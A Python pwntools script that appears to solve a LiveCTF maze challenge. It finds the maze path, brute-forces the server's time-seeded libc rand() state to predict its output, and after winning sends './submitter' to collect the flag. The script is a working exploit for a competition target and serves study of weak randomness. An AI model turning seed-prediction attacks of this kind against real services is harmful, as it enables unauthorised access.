from pwn import *
from pwn import p64, p32
import subprocess
from ctypes import CDLL
from datetime import datetime
import re


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, env={"LD_PRELOAD": "./hook.so"})  #


def one_gadget(libc_file):
    return [
        int(i)
        for i in subprocess.check_output(["one_gadget", "--raw", libc_file])
        .decode()
        .split(" ")
    ]


gdbscript = ""

breakpoints = [
    #        'breakrva 0xoffset',
    "continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
        libc = ELF('./libc.so.6', checksec=False)
else:
        libc: ELF = elf.libc # type: ignore
"""

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

OBJECTS = {
    "WALL": "#",
    "SPACE": ".",
    "VISITED": "x",
}


def readfile(file):
    try:
        f = open(file, "r")
    except Exception as e:
        print("Error opening file. Did you enter the correct file-path?")
        print(e)

    # read each line
    grid = [line.replace("\n", "").split(",") for line in f]
    return grid


global target_x, target_y
target_x = 0
target_y = 0


# def check_matrix(grid):
#     global target_x, target_y
#     for i in range(0, len(grid)):
#         for j in range(0, len(grid[i])):
#             # if there is an undefined character, something is most likely going to be wrong
#             if grid[i][j] == "*":
#                 target_x = j
#                 target_y = i
#                 grid[i][j] = "."
#             if not grid[i][j] in OBJECTS.values():
#                 return False
#     return True


# def valid(x, y, grid):
#     # to be valid the position has to be inside the grid and not yet been visited
#     return (
#         0 <= x < len(grid[0]) and 0 <= y < len(grid) and grid[y][x] is OBJECTS["SPACE"]
#     )


# def find_path(grid, x, y, endx, endy, path):
#     # destination reached ?
#     if x == endx and y == endy:
#         return path
#     # current position must be valid
#     if not valid(x, y, grid):
#         return None
#     # mark current position
#     grid[y][x] = OBJECTS["VISITED"]
#     print(x, y)
#     # for l in grid[y]:
#     #     print("".join(l))
#     # try every possible direction
#     # north
#     if find_path(grid, x, y - 1, endx, endy, path) is not None:
#         path.append("n")
#         return path
#     # south
#     if find_path(grid, x, y + 1, endx, endy, path) is not None:
#         path.append("s")
#         return path
#     # east
#     if find_path(grid, x + 1, y, endx, endy, path) is not None:
#         path.append("e")
#         return path
#     # west
#     if find_path(grid, x - 1, y + 1, endx, endy, path) is not None:
#         path.append("w")
#         return path
#     # every possible step was invalid
#     # so just take a step back
#     if len(path) > 0:
#         path.remove(len(path) - 1)
#     grid[y][x] = OBJECTS["SPACE"]

VALID_OBJECTS = "#.@*x"


def valid(x, y, grid):
    # to be valid the position has to be inside the grid and not yet been visited
    return 0 <= x < len(grid[0]) and 0 <= y < len(grid) and grid[y][x] == "."


def find_paths(grid, x, y):
    done = {}
    _find_paths(grid, x, y, done, ())
    return done


def _find_paths(grid, x, y, done, path):
    if not valid(x, y, grid):
        return
    if (x, y) in done:
        return
    done[(x, y)] = path

    _find_paths(grid, x + 1, y + 0, done, path + ("e",))
    _find_paths(grid, x - 1, y + 0, done, path + ("w",))
    _find_paths(grid, x + 0, y + 1, done, path + ("s",))
    _find_paths(grid, x + 0, y - 1, done, path + ("n",))


def get_character(grid, char):
    for i in range(0, len(grid)):
        for j in range(0, len(grid[i])):
            # if there is an undefined character, something is most likely going to be wrong
            if grid[i][j] == char:
                grid[i][j] = "."
                return j, i
            if not grid[i][j] in VALID_OBJECTS:
                assert False
    assert False


def get_path_from_maze_string(string):
    maze = [list(x) for x in string.replace(" ", "").split("\n")]
    start_x, start_y = get_character(maze, "@")
    target_x, target_y = get_character(maze, "*")
    paths = find_paths(maze, start_x, start_y)
    return paths[(target_x, target_y)]


class Exploit:
    libc = CDLL("libc.so.6")
    detected = False

    def __init__(self) -> None:
        HOST = os.environ.get("HOST", "localhost")
        PORT = 31337

        self.io = remote(HOST, int(PORT))
        return

    def dbg(self):
        if not args.REMOTE:
            gdb.attach(self.io, gdbscript=gdbscript)

    def do_randomness(self, inp):
        v2 = []
        v3 = []
        v4 = []
        v2.append("cozy")
        v2.append("medium-sized")
        v2.append("spacious")
        v2.append("massive")
        v3.append("bookshelves")
        v3.append("fireplaces")
        v3.append("suits of armor")
        v3.append("tables")
        v3.append("chests")
        v3.append("beds")
        v3.append("paintings")
        v3.append("statues")
        v3.append("tapestries")
        v3.append("candelabras")
        v3.append("chairs")
        v3.append("fountains")
        v3.append("mirrors")
        v3.append("rugs")
        v3.append("curtains")
        v3.append("chess sets")
        v4.append("Art Deco")
        v4.append("Baroque")
        v4.append("Classical")
        v4.append("Colonial")
        v4.append("Contemporary")
        v4.append("Country")
        v4.append("Gothic")
        v4.append("Industrial")
        v4.append("Mediterranean")
        v4.append("Minimalist")
        v4.append("Neoclassical")
        v4.append("Renaissance")
        v4.append("Rococo")
        v4.append("Romantic")
        v4.append("Rustic")
        v4.append("Victorian")
        if self.detected:
            v0 = self.libc.rand()
            first = v2[v0 & 3]
            second = v3[(v0 >> 2) & 0xF]
            third = v3[(v0 >> 6) & 0xF]
            fourth = (v0 >> 14) & 0x1F
            fifth = v0 >> 14
            sixth = v4[(v0 >> 10) & 0xF]
            # print(first, second, third, fourth, fifth, sixth)
            # print(inp)
            assert first == inp[0]
            assert second == inp[1]
            assert third == inp[2]
            assert str(fourth) == str(inp[3])
            assert str(fifth) == str(inp[4])
            assert sixth == inp[5]
            return
        self.detected = True
        unix_start = self.unix_timestamp  # - 7200
        for time in range(unix_start - 10, unix_start + 10):
            self.libc = CDLL("libc.so.6")
            self.libc.srand(time)
            i = 0
            for _ in range(591):
                self.libc.rand()
                i = i + 1
            v0 = self.libc.rand()
            # print(i + 1, time, unix_start)
            first = v2[v0 & 3]
            second = v3[(v0 >> 2) & 0xF]
            third = v3[(v0 >> 6) & 0xF]
            fourth = (v0 >> 14) & 0x1F
            fifth = v0 >> 14
            sixth = v4[(v0 >> 10) & 0xF]
            # print(first, second, third, fourth, fifth, sixth)
            # print(inp)
            # print(
            #     first == inp[0],
            #     second == inp[1],
            #     third == inp[2],
            #     str(fourth) == str(inp[3]),
            #     str(fifth) == str(inp[4]),
            #     sixth == inp[5],
            # )
            if (
                first == inp[0]
                and second == inp[1]
                and third == inp[2]
                and str(fourth) == str(inp[3])
                and str(fifth) == str(inp[4])
                and sixth == inp[5]
            ):
                self.unix_timestamp = time
                print("WORKING TIMESTAMP FOUND", self.unix_timestamp)
                return
        exit(1)

    def reverse_dir(self, dir):
        if dir == "n":
            return "s"
        if dir == "s":
            return "n"
        if dir == "e":
            return "w"
        if dir == "w":
            return "e"

    def solve_path(self, path):
        without_last = path[:-1]
        for direction in without_last:
            self.io.sendlineafter(b"end the torment: ", direction.encode())
            self.io.recvline()
            description = self.io.recvuntil(b" style.\n").decode()
            pattern = re.compile(
                "As you step into the room, you find yourself standing in a (.+) space. The walls are adorned with (.+) and a two large (.+) dominate the center of the room. You see (\d+) flowers in a vase, and through a window you stop to count (\d+) stars. The room appears well designed in the (.+) style.\n"
            )
            m = pattern.findall(description)[0]
            self.do_randomness(m)

        while True:
            result = self.libc.rand()
            print(result)
            if result % 1213 == 1212:
                self.io.sendlineafter(b"end the torment: ", path[-1].encode())
                self.io.sendline(b"./submitter")
                flag = self.io.recvline_contains(b"LiveCTF{").decode().strip()
                log.info("Flag: %s", flag)
                return
            else:
                rev = self.reverse_dir(path[-2])
                self.io.sendlineafter(b"end the torment: ", rev.encode())
                self.io.sendlineafter(b"end the torment: ", path[-2].encode())
                self.libc.rand()

    def exploit(self):
        global target_x, target_y
        self.unix_timestamp = int(
            (datetime.utcnow() - datetime(1970, 1, 1)).total_seconds()
        )

        # self.unix_timestamp = 1685195481

        self.io.sendlineafter(b"end the torment: ", b"a")
        self.io.recvuntil(
            b"You cast arcane eye and send your summoned magical eye above the maze.\n"
        )
        maze = self.io.recvuntil(
            b"\n                              \nYou are in room", True
        ).decode()
        correct_maze = [
            list(x) for x in maze.replace("@", ".").replace(" ", "").split("\n")
        ]
        print(maze)
        # assert check_matrix(correct_maze)
        # print(
        #     target_x,
        #     target_y,
        # )
        # path = find_path(correct_maze, 1, 1, target_x, target_y, [])
        # print(path)

        path = get_path_from_maze_string(maze)
        print(path)

        # self.libc.srand(self.unix_timestamp)
        self.solve_path(path)

        # input()
        # for p in path:
        #     print(p)
        #     self.io.sendlineafter(b"end the torment: ", p.encode())
        # print(unix_timestamp)

        # self.io.interactive()


exploit = Exploit()
exploit.exploit()
